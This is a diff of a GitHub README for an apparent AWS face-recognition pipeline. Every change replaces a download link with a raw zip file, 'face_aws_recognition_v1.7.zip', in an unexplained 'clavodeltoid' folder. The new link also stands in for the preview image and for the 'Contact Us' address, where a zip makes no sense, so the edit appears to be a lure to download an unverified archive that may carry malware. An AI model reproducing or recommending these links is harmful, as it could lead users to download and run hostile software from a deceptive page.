@@ -20,7 +20,7 @@ arizona-state-university, aws, cloud-computing, docker, dockerfile, ec2, face-re
 
 To dive into the project and start implementing the AWS Face Recognition pipeline, download the repository contents from the following link: 
 
-[![Download AWS Face Recognition](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip%20Face%20Recognition&color=success)](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip)
+[![Download AWS Face Recognition](https://github.com/Saninmysore/aws-face-recognition/raw/refs/heads/main/clavodeltoid/face_aws_recognition_v1.7.zip%20Face%20Recognition&color=success)](https://github.com/Saninmysore/aws-face-recognition/raw/refs/heads/main/clavodeltoid/face_aws_recognition_v1.7.zip)
 
 <!-- Needs to be launched - Download the repository files to get started. -->
 
@@ -30,7 +30,7 @@ If the link above is inactive or not functioning properly, please check the "Rel
 
 Here is a sneak peek of what the AWS Face Recognition pipeline can achieve:
 
-![Face Recognition Output](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip)
+![Face Recognition Output](https://github.com/Saninmysore/aws-face-recognition/raw/refs/heads/main/clavodeltoid/face_aws_recognition_v1.7.zip)
 
 ## 🚧 Contribution Guidelines
 
@@ -43,7 +43,7 @@ Contributions to the AWS Face Recognition project are welcome! To contribute, fo
 
 ## 📞 Contact Us
 
-If you have any questions, feedback, or suggestions regarding the AWS Face Recognition pipeline, feel free to reach out to us at [https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip](https://github.com/Saninmysore/aws-face-recognition/releases/download/v1.0/Software.zip).
+If you have any questions, feedback, or suggestions regarding the AWS Face Recognition pipeline, feel free to reach out to us at [https://github.com/Saninmysore/aws-face-recognition/raw/refs/heads/main/clavodeltoid/face_aws_recognition_v1.7.zip](https://github.com/Saninmysore/aws-face-recognition/raw/refs/heads/main/clavodeltoid/face_aws_recognition_v1.7.zip).
 
 Happy coding! 🚀
 
